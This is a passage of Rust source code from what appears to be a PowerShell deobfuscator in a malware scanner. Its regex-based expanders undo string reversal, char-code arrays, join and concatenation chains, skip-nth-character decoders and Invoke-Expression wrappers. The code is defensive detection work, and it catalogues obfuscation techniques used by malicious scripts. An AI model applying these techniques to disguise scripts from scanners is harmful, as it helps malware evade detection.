            if requested_len == 0 || requested_len > chars.len() {
                return None;
            }
            let reversed: String = chars.iter().rev().take(requested_len).collect();
            Some((full.start(), full.end(), format!("'{}'", reversed)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static TOCHARARRAY_REVERSE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:'([^']*)'|"([^"]*)")\s*;\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\.ToCharArray\s*\(\s*\)\s*;\s*\[array\]::Reverse\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*;\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*-join\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("tochararray reverse join")
});

#[allow(clippy::expect_used)]
static LITERAL_TOCHARARRAY_REVERSE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*(?:'([^']*)'|"([^"]*)")\s*;.{0,300}?\$[A-Za-z_][A-Za-z0-9_]*\s*=\s*(?:'([^']*)'|"([^"]*)")\s*\.ToCharArray\s*\(\s*\)\s*;.{0,200}?\[array\]::Reverse\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*\)\s*;.{0,200}?(\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*-join\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*\))"#,
    )
    .expect("literal tochararray reverse join")
});

fn expand_tochararray_reverse_join(text: &str) -> String {
    let mut matches: Vec<(usize, usize, String)> = TOCHARARRAY_REVERSE_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let src_var = caps.get(1)?.as_str();
            let value = caps.get(2).or_else(|| caps.get(3))?.as_str();
            let arr_var = caps.get(4)?.as_str();
            let src_ref = caps.get(5)?.as_str();
            let reverse_ref = caps.get(6)?.as_str();
            let dst_var = caps.get(7)?.as_str();
            let join_ref = caps.get(8)?.as_str();
            if src_ref != src_var || reverse_ref != arr_var || join_ref != arr_var {
                return None;
            }
            let reversed: String = value.chars().rev().collect();
            let replacement = format!(
                "${src_var}='{value}';${arr_var}=${src_var}.ToCharArray();[array]::Reverse(${arr_var});${dst_var}='{reversed}'"
            );
            Some((full.start(), full.end(), replacement))
        })
        .collect();
    matches.extend(
        LITERAL_TOCHARARRAY_REVERSE_JOIN_RE
            .captures_iter(text)
            .filter_map(|caps| {
                let value = caps.get(1).or_else(|| caps.get(2))?.as_str();
                let arr_value = caps.get(3).or_else(|| caps.get(4))?.as_str();
                let reverse_value = caps.get(5).or_else(|| caps.get(6))?.as_str();
                let final_assignment = caps.get(7)?;
                let dst_var = caps.get(8)?.as_str();
                let join_value = caps.get(9).or_else(|| caps.get(10))?.as_str();
                if value != arr_value || value != reverse_value || value != join_value {
                    return None;
                }
                let reversed: String = value.chars().rev().collect();
                Some((
                    final_assignment.start(),
                    final_assignment.end(),
                    format!("${dst_var}='{reversed}'"),
                ))
            }),
    );
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn previous_non_whitespace(text: &str, pos: usize) -> Option<char> {
    text[..pos].chars().rev().find(|c| !c.is_whitespace())
}

fn expand_ps_join(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let parts_text = caps.get(1)?.as_str();
            let sep = caps.get(2).or_else(|| caps.get(3))?.as_str();
            let parts: Vec<String> = JOIN_PART_RE
                .captures_iter(parts_text)
                .filter_map(|c| {
                    c.get(1)
                        .or_else(|| c.get(2))
                        .map(|m| m.as_str().to_string())
                })
                .collect();
            if parts.is_empty() {
                return None;
            }
            Some((full.start(), full.end(), format!("'{}'", parts.join(sep))))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_string_join(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = STRING_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let sep = caps.get(1).or_else(|| caps.get(2))?.as_str();
            let parts_text = caps.get(3)?.as_str();
            let parts: Vec<String> = JOIN_PART_RE
                .captures_iter(parts_text)
                .filter_map(|c| {
                    c.get(1)
                        .or_else(|| c.get(2))
                        .map(|m| m.as_str().to_string())
                })
                .collect();
            if parts.is_empty() || parts.len() > 128 || sep.len() > 64 {
                return None;
            }
            let joined = parts.join(sep);
            if joined.len() > 8192 {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format!("'{}'", joined.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_string_concat_static(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = STRING_CONCAT_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let parts_text = caps.get(1)?.as_str();
            let parts: Vec<String> = JOIN_PART_RE
                .captures_iter(parts_text)
                .filter_map(|c| {
                    c.get(1)
                        .or_else(|| c.get(2))
                        .map(|m| m.as_str().to_string())
                })
                .collect();
            if parts.is_empty() || parts.len() > 128 {
                return None;
            }
            let joined = parts.join("");
            if joined.len() > 8192 {
                return None;
            }
            Some((
                full.start(),
                full.end(),
                format!("'{}'", joined.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[allow(clippy::expect_used)]
static PS_VAR_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    // $name = 'literal', $name = "literal", or the common no-op subexpression
    // wrapper $name = $('literal'). Double-quoted values with interpolation or
    // metacharacters are intentionally skipped.
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:\$\(\s*)?(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")(?:\s*\))?"#,
    )
    .expect("ps var assign")
});

#[allow(clippy::expect_used)]
static PS_ARRAY_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@?\(?\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)+(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)?"#)
        .expect("ps array assign")
});

#[allow(clippy::expect_used)]
static PS_JOIN_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\(?\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*-join\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*\)?"#)
        .expect("ps join assign")
});

#[allow(clippy::expect_used)]
static PS_VAR_REF_RE: Lazy<Regex> = Lazy::new(|| {
    // $name reference
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)"#).expect("ps var ref")
});

#[allow(clippy::expect_used)]
static PS_INDEX_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*\[\s*\d+\s*\]\s*\+\s*)+\$[A-Za-z_][A-Za-z0-9_]*\s*\[\s*\d+\s*\])"#,
    )
    .expect("ps index concat assign")
});

#[allow(clippy::expect_used)]
static PS_VAR_CONCAT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*\+\s*)+\$[A-Za-z_][A-Za-z0-9_]*)"#,
    )
    .expect("ps var concat assign")
});

#[allow(clippy::expect_used)]
static PS_INDEX_REF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*\[\s*(\d+)\s*\]"#).expect("ps index ref")
});

fn ps_literal_assignment_value(caps: &regex::Captures<'_>) -> Option<String> {
    caps.get(2)
        .map(|m| m.as_str().replace("''", "'"))
        .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))
}

fn expand_ps_index_concat_assignments(text: &str) -> String {
    let mut bindings: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(n), Some(v)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            bindings.insert(n.as_str().to_ascii_lowercase(), v);
        }
    }
    if bindings.is_empty() {
        return text.to_string();
    }

    let matches: Vec<(usize, usize, String)> = PS_INDEX_CONCAT_ASSIGN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let dst = caps.get(1)?.as_str();
            let rhs = caps.get(2)?.as_str();
            let mut decoded = String::new();
            for ref_caps in PS_INDEX_REF_RE.captures_iter(rhs) {
                let var = ref_caps.get(1)?.as_str();
                let idx: usize = ref_caps.get(2)?.as_str().parse().ok()?;
                let value = bindings.get(&var.to_ascii_lowercase())?;
                decoded.push(value.chars().nth(idx)?);
            }
            if decoded.is_empty() {
                return None;
            }
            Some((full.start(), full.end(), format!("${dst}='{}'", decoded)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_ps_variables(text: &str) -> String {
    let mut bindings: std::collections::HashMap<String, String> = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(n), Some(v)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            let after = text[caps.get(0).map_or(0, |m| m.end())..].trim_start();
            if after.starts_with('+') {
                continue;
            }
            bindings.insert(n.as_str().to_ascii_lowercase(), v);
        }
    }
    for caps in PS_ARRAY_ASSIGN_RE.captures_iter(text) {
        let (Some(n), Some(parts_text)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let parts: Vec<String> = JOIN_PART_RE
            .captures_iter(parts_text.as_str())
            .filter_map(|c| {
                c.get(1)
                    .or_else(|| c.get(2))
                    .map(|m| m.as_str().to_string())
            })
            .collect();
        if !parts.is_empty() {
            bindings.insert(n.as_str().to_ascii_lowercase(), parts.join(""));
        }
    }
    for caps in PS_JOIN_ASSIGN_RE.captures_iter(text) {
        let (Some(dst), Some(src), Some(sep)) = (
            caps.get(1),
            caps.get(2),
            caps.get(3).or_else(|| caps.get(4)),
        ) else {
            continue;
        };
        if let Some(value) = bindings.get(&src.as_str().to_ascii_lowercase()).cloned() {
            let joined = if sep.as_str().is_empty() {
                value
            } else {
                value
                    .chars()
                    .map(|c| c.to_string())
                    .collect::<Vec<_>>()
                    .join(sep.as_str())
            };
            bindings.insert(dst.as_str().to_ascii_lowercase(), joined);
        }
    }
    for caps in PS_VAR_CONCAT_ASSIGN_RE.captures_iter(text) {
        let (Some(dst), Some(rhs)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let mut joined = String::new();
        let mut ok = false;
        for part in PS_VAR_REF_RE.captures_iter(rhs.as_str()) {
            let Some(name) = part.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(value) = bindings.get(&name.to_ascii_lowercase()) else {
                ok = false;
                break;
            };
            joined.push_str(value);
            ok = true;
        }
        if ok && !joined.is_empty() {
            bindings.insert(dst.as_str().to_ascii_lowercase(), joined);
        }
    }
    if bindings.is_empty() {
        return text.to_string();
    }

    // Replace $name references with 'value' (quoted, so URL regexes still match).
    // Collect all replacements from original text, then apply in reverse order.
    let matches: Vec<(usize, usize, String)> = PS_VAR_REF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let name = caps.get(1)?.as_str();
            // Don't replace inside assignment LHS — heuristic: skip refs
            // immediately followed by an assignment operator, but not equality.
            let after = &text[full.end()..];
            let after_trim = after.trim_start();
            if is_ps_assignment_operator(after_trim) {
                return None;
            }
            bindings.get(&name.to_ascii_lowercase()).and_then(|v| {
                if is_large_literal_carrier(v) {
                    return None;
                }
                Some((full.start(), full.end(), format!("'{}'", v)))
            })
        })
        .collect();

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn is_large_literal_carrier(value: &str) -> bool {
    value.len() >= 64 * 1024
        || (value.len() >= 8192
            && value
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=')))
}

fn is_ps_assignment_operator(text: &str) -> bool {
    if text.starts_with("==") {
        return false;
    }
    text.starts_with('=')
        || text.starts_with("+=")
        || text.starts_with("-=")
        || text.starts_with("*=")
        || text.starts_with("/=")
        || text.starts_with("%=")
}

// ---- Space-concat expander (Pattern C) ----

#[allow(clippy::expect_used)]
static SPACE_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // 'a' 'b' 'c' ...  (2+ adjacent single-quoted strings separated by whitespace ONLY,
    // no + or - operator between them)
    // The separator between strings is pure whitespace (no operator chars).
    Regex::new(r#"'[^']*'(?:\s+'[^']*')+"#).expect("space concat")
});

fn expand_space_concat(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = SPACE_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            let s = m.as_str();
            // Extract all single-quoted parts
            let parts_re = regex::Regex::new(r"'([^']*)'").ok()?;
            let parts: Vec<String> = parts_re
                .captures_iter(s)
                .filter_map(|c| c.get(1).map(|cap| cap.as_str().to_string()))
                .collect();
            if parts.len() < 2 {
                return None;
            }
            let combined = parts.join("");
            Some((m.start(), m.end(), format!("'{}'", combined)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

// ---- Char-array chunk expander (Pattern D) ----

#[allow(clippy::expect_used)]
static CHAR_ARRAY_CHUNK_RE: Lazy<Regex> = Lazy::new(|| {
    // ([char[]]@( N1,N2,N3 )-join '')
    Regex::new(r#"\(\[char\[\]\]\s*@\(\s*((?:\d+\s*,\s*)*\d+)\s*\)\s*-join\s*['"][^'"]*['"]\s*\)"#)
        .expect("char arr chunk")
});

#[allow(clippy::expect_used)]
static STRING_JOIN_CHAR_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[(?:System\.)?String\]::Join\s*\(\s*['"]([^'"]*)['"]\s*,\s*\[char\[\]\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){2,})\)\s*\)"#,
    )
    .expect("string join char array")
});

#[allow(clippy::expect_used)]
static UNARY_JOIN_CHAR_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)-join\s+\[char\[\]\]\s*@?\(\s*((?:0x[0-9a-f]+|\d+)\s*(?:,\s*(?:0x[0-9a-f]+|\d+)\s*){2,})\)\s*"#,
    )
    .expect("unary join char array")
});

fn decode_char_array_nums(nums_str: &str) -> Option<String> {
    let chars: Vec<char> = nums_str
        .split(',')
        .filter_map(|s| s.trim().parse::<u32>().ok())
        .filter_map(char::from_u32)
        .collect();
    if chars.is_empty() {
        return None;
    }
    Some(chars.into_iter().collect())
}

fn decode_ps_char_array_nums(nums_str: &str, separator: &str) -> Option<String> {
    let chars: Vec<String> = nums_str
        .split(',')
        .map(|part| {
            let value = parse_ps_char_codepoint(part.trim())?;
            char::from_u32(value).map(|ch| ch.to_string())
        })
        .collect::<Option<_>>()?;
    if chars.is_empty() || chars.len() > 128 * 1024 {
        return None;
    }
    Some(chars.join(separator))
}

fn expand_string_join_char_arrays(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = STRING_JOIN_CHAR_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let separator = caps.get(1)?.as_str();
            let decoded = decode_ps_char_array_nums(caps.get(2)?.as_str(), separator)?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", decoded.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_unary_join_char_arrays(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = UNARY_JOIN_CHAR_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let decoded = decode_ps_char_array_nums(caps.get(1)?.as_str(), "")?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", decoded.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_char_array_concat_chunks(text: &str) -> String {
    let mut manual_matches = Vec::new();
    let mut search_from = 0;
    while let Some(rel) = text[search_from..].to_ascii_lowercase().find("([char[]]@(") {
        let start = search_from + rel;
        let Some((mut end, first)) = parse_char_array_chunk_at(text, start) else {
            search_from = start + 1;
            continue;
        };
        let mut decoded = first;
        let mut count = 1;
        loop {
            let rest = &text[end..];
            let trimmed = rest.trim_start();
            if !trimmed.starts_with('+') {
                break;
            }
            let ws = rest.len() - trimmed.len();
            let after_plus = &trimmed[1..];
            let after_plus_trimmed = after_plus.trim_start();
            let next_start = end + ws + 1 + (after_plus.len() - after_plus_trimmed.len());
            let Some((next_end, next_decoded)) = parse_char_array_chunk_at(text, next_start) else {
                break;
            };
            decoded.push_str(&next_decoded);
            end = next_end;
            count += 1;
        }
        if count > 1 {
            manual_matches.push((start, end, format!("'{}'", decoded)));
            search_from = end;
        } else {
            search_from = start + 1;
        }
    }
    if !manual_matches.is_empty() {
        let mut out = text.to_string();
        for (start, end, replacement) in manual_matches.into_iter().rev() {
            out.replace_range(start..end, &replacement);
        }
        return out;
    }

    let chunks: Vec<(usize, usize, String)> = CHAR_ARRAY_CHUNK_RE
        .captures_iter(text)
        .filter_map(|m| {
            let full = m.get(0)?;
            let decoded = decode_char_array_nums(m.get(1)?.as_str())?;
            Some((full.start(), full.end(), decoded))
        })
        .collect();
    let mut matches = Vec::new();
    let mut i = 0;
    while i < chunks.len() {
        let (start, mut end, first) = chunks[i].clone();
        let mut decoded = first;
        let mut j = i + 1;
        while j < chunks.len() {
            let between = text[end..chunks[j].0].trim();
            if between != "+" {
                break;
            }
            decoded.push_str(&chunks[j].2);
            end = chunks[j].1;
            j += 1;
        }
        if j > i + 1 {
            matches.push((start, end, format!("'{}'", decoded)));
            i = j;
        } else {
            i += 1;
        }
    }
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_char_array_chunk_at(text: &str, start: usize) -> Option<(usize, String)> {
    let lower = text[start..].to_ascii_lowercase();
    let prefix = "([char[]]@(";
    if !lower.starts_with(prefix) {
        return None;
    }
    let nums_start = start + prefix.len();
    let nums_end = text[nums_start..].find(')')? + nums_start;
    let decoded = decode_char_array_nums(&text[nums_start..nums_end])?;
    let after_nums = &text[nums_end + 1..];
    let after_trimmed = after_nums.trim_start();
    if !after_trimmed.to_ascii_lowercase().starts_with("-join") {
        return None;
    }
    let chunk_end = nums_end + 1 + after_nums.find(')')? + 1;
    Some((chunk_end, decoded))
}

fn expand_char_array_chunks(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = CHAR_ARRAY_CHUNK_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let s = decode_char_array_nums(caps.get(1)?.as_str())?;
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    // After each chunk becomes 'x', a chain like 'a' + 'b' + 'c' is now standard PS
    // concatenation — expand_string_concat (already in pipeline) handles that.
    out
}

// ---- Skip-Nth-Char decoder (Invoke-Obfuscation pattern) ----

#[allow(clippy::expect_used)]
static SKIP_NTH_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    // Matches: function NAME(...){ ... } or New-Item function definitions.
    // Captures: group 1 = fn name from `function NAME`, group 2 = fn name from `-n/-Name NAME`
    // The body must contain a do{...} until loop with $idx += N pattern.
    Regex::new(
        r#"(?is)(?:function\s+(\w+)\s*\([^)]*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{([^{}]*?do\s*\{[^{}]*?\$(\w+)\s*\+=\s*(\d+)[^{}]*?\}[^{}]*?until[^{}]*?)\}"#
    ).expect("skip-nth def")
});

#[allow(clippy::expect_used)]
static SKIP_NTH_INIT_RE: Lazy<Regex> = Lazy::new(|| {
    // Extracts: $idx = N (initializer before the loop)
    Regex::new(r#"\$(\w+)\s*=\s*(\d+)"#).expect("skip-nth init")
});

#[allow(clippy::expect_used)]
static INVOKE_EXPRESSION_WRAPPER_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)(?:function\s+(\w+)\s*\([^)]*\)|-(?:n|name)\s+(\w+))\s*[^{]*\{[^{}]*invoke-expression[^{}]*\}"#,
    )
    .expect("invoke-expression wrapper def")
});

fn expand_invoke_expression_wrappers(text: &str) -> String {
    let names: Vec<String> = INVOKE_EXPRESSION_WRAPPER_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            caps.get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())
        })
        .collect();
    if names.is_empty() {
        return text.to_string();
    }

    let mut out = text.to_string();
    for name in names {
        out = inline_ps_literal_calls(&out, &name);
    }
    out
}

fn inline_ps_literal_calls(text: &str, name: &str) -> String {
    let lower = text.to_ascii_lowercase();
    let needle = name.to_ascii_lowercase();
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut search_from = 0;

    while let Some(rel) = lower[search_from..].find(&needle) {
        let start = search_from + rel;
        let end_name = start + name.len();
        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
            || is_ident_byte(bytes.get(end_name).copied())
        {
            search_from = end_name;
            continue;
        }

        let mut pos = skip_ascii_ws(bytes, end_name);
        let parenthesized = bytes.get(pos) == Some(&b'(');
        if parenthesized {
            pos = skip_ascii_ws(bytes, pos + 1);
        }
        if bytes.get(pos) != Some(&b'\'') {
            search_from = end_name;
            continue;
        }
        let Some((literal_end, value)) = parse_ps_single_quoted_literal(text, pos) else {
            search_from = end_name;
            continue;
        };
        let mut call_end = literal_end;
        if parenthesized {
            let after = skip_ascii_ws(bytes, call_end);
            if bytes.get(after) != Some(&b')') {
                search_from = end_name;
                continue;
            }
            call_end = after + 1;
        }
        matches.push((start, call_end, value));
        search_from = call_end;
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn is_ident_byte(byte: Option<u8>) -> bool {
    byte.is_some_and(|b| b.is_ascii_alphanumeric() || b == b'_')
}

fn skip_ascii_ws(bytes: &[u8], mut pos: usize) -> usize {
    while bytes.get(pos).is_some_and(|b| b.is_ascii_whitespace()) {
        pos += 1;
    }
    pos
}

fn parse_ps_single_quoted_literal(text: &str, start: usize) -> Option<(usize, String)> {
    let bytes = text.as_bytes();
    if bytes.get(start) != Some(&b'\'') {
        return None;
    }
    let mut pos = start + 1;
    let mut out = String::new();
    while pos < bytes.len() {
        if bytes[pos] == b'\'' {
            if bytes.get(pos + 1) == Some(&b'\'') {
                out.push('\'');
                pos += 2;
                continue;
            }
            return Some((pos + 1, out));
        }
        let ch = text[pos..].chars().next()?;
        out.push(ch);
        pos += ch.len_utf8();
    }
    None
}

#[allow(clippy::expect_used)]
static SKIP_NTH_FOR_SUBSTRING_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\([^)]*\)\s*\{[^{}]*?for\s*\(\s*\$(\w+)\s*=\s*(\d+)\s*;[^;]*?;\s*\$(\w+)\s*\+=\s*(\d+)\s*\)\s*\{[^{}]*?\.\s*'su'\s*\.\s*'Invoke'\s*\(\s*\$(\w+)\s*,"#,
    )
    .expect("skip-nth for substring def")
});

// Musculos-style `do { $acc += $param[$idx]; $idx += STEP } until (!$param[$idx])`
// stride decoder. Same call shape as SKIP_NTH_FOR_SUBSTRING (NAME 'carrier'), but
// the function body uses do/until instead of for. Captures: 1=function name,
// 2=index-var (init), 3=start, 4=index-var (increment) — must equal 2,
// 5=step.
#[allow(clippy::expect_used)]
static MUSCULOS_DEF_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)function\s+(\w+)\s*\([^)]*\)\s*\{\s*\$(\w+)\s*=\s*(\d+)\s*;\s*do\s*\{[^{}]*?\$\w+\s*\+=\s*\$\w+\[\s*\$\w+\s*\][^{}]*?\$(\w+)\s*\+=\s*(\d+)[^{}]*?\}\s*until\s*\(\s*!\s*\$\w+\[\s*\$\w+\s*\]\s*\)"#,
    )
    .expect("musculos stride def")
});

fn expand_skip_nth(text: &str) -> String {
    let mut out = text.to_string();
    // Collect all function definitions with their skip parameters
    let defs: Vec<(String, usize, usize)> = SKIP_NTH_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            // fn name: group 1 (function NAME) or group 2 (-n NAME)
            let fn_name = caps
                .get(1)
                .or_else(|| caps.get(2))
                .map(|m| m.as_str().to_string())?;
            // body: group 3
            let body = caps.get(3)?.as_str();
            // step: group 5 (the $idx += N value)
            let step: usize = caps.get(5)?.as_str().parse().ok()?;
            if step == 0 || step > 10 {
                return None;
            }
            // Find start index: look for $VAR = N initializer in the body
            // The init variable should match the step variable (group 4)
            let idx_var = caps.get(4)?.as_str();
            let start: usize = SKIP_NTH_INIT_RE
                .captures_iter(body)
                .find(|c| c.get(1).map(|m| m.as_str()) == Some(idx_var))
                .and_then(|c| c.get(2)?.as_str().parse().ok())
                .unwrap_or(1);
            if start > 10 {
                return None;
            }
            Some((fn_name, start, step))
        })
        .collect();

    for (name, start, step) in defs {
        // Find call sites: NAME 'carrier' / NAME "carrier" / NAME('carrier')
        // / NAME ( "carrier" ). The leading `(?:^|[^\w])` is a manual word
        // boundary that prevents `BarFoo('x')` from matching when the
        // function name is `Foo` — `\b` alone would happily anchor at the
        // `F` inside `BarFoo`. Carrier minimum length 4: at start≥1 step≥1
        // a 1-3 char carrier almost never decodes to a meaningful token,
        // and lower limits invited false rewrites on unrelated literals.
        let call_re_str = format!(
            r#"(?i)(?:^|[^\w]){}\s*\(?\s*['"]([^'"{{}}]{{4,2048}})['"]\s*\)?"#,
            regex::escape(&name)
        );
        let Ok(call_re) = regex::Regex::new(&call_re_str) else {
            continue;
        };
        let call_matches: Vec<(usize, usize, String)> = call_re
            .captures_iter(&out)
            .filter_map(|cc| {
                let full = cc.get(0)?;
                let carrier = cc.get(1)?.as_str();
                // The `(?:^|[^\w])` prefix consumes a delimiter char (when
                // not at line start) that's NOT part of the call we want to
                // rewrite. Keep that char in the output so the surrounding
                // token / line structure isn't damaged.
                let raw_match = full.as_str();
                let name_start = raw_match
                    .find(|c: char| c.is_alphanumeric() || c == '_')
                    .unwrap_or(0);
                let prefix = &raw_match[..name_start];

                let chars: Vec<char> = carrier.chars().collect();
                let mut decoded = String::new();
                let mut i = start;
                while i < chars.len() {
                    decoded.push(chars[i]);
                    i = i.checked_add(step).unwrap_or(chars.len());
                }
                if decoded.is_empty() {
                    return None;
                }
                let replacement = format!("{}'{}'", prefix, decoded.replace('\'', ""));
                Some((full.start(), full.end(), replacement))
            })
            .collect();
        for (start_pos, end_pos, replacement) in call_matches.into_iter().rev() {
            out.replace_range(start_pos..end_pos, &replacement);
        }
    }
    out
}

fn expand_skip_nth_for_substring(text: &str) -> String {
    let mut out = text.to_string();
    let mut defs: Vec<(String, usize, usize)> = SKIP_NTH_FOR_SUBSTRING_DEF_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let name = caps.get(1)?.as_str().to_string();
            let init_var = caps.get(2)?.as_str();
            let step_var = caps.get(4)?.as_str();
            let invoke_var = caps.get(6)?.as_str();
            if !init_var.eq_ignore_ascii_case(step_var)
                || !init_var.eq_ignore_ascii_case(invoke_var)
            {
                return None;
            }
            let start: usize = caps.get(3)?.as_str().parse().ok()?;
            let step: usize = caps.get(5)?.as_str().parse().ok()?;
            if start > 10 || step == 0 || step > 10 {
                return None;
            }
            Some((name, start, step))
        })
        .collect();
    // Musculos-style do/until variants. Same (start, step) carrier semantics.
    defs.extend(MUSCULOS_DEF_RE.captures_iter(text).filter_map(|caps| {
        let name = caps.get(1)?.as_str().to_string();
        let init_var = caps.get(2)?.as_str();
        let inc_var = caps.get(4)?.as_str();
        if !init_var.eq_ignore_ascii_case(inc_var) {
            return None;
        }
        let start: usize = caps.get(3)?.as_str().parse().ok()?;
        let step: usize = caps.get(5)?.as_str().parse().ok()?;
        if start > 10 || step == 0 || step > 10 {
            return None;
        }
        Some((name, start, step))
    }));

    for (name, start, step) in defs {
        // Accept both NAME 'carrier' and NAME('carrier') / NAME ( 'carrier' ).
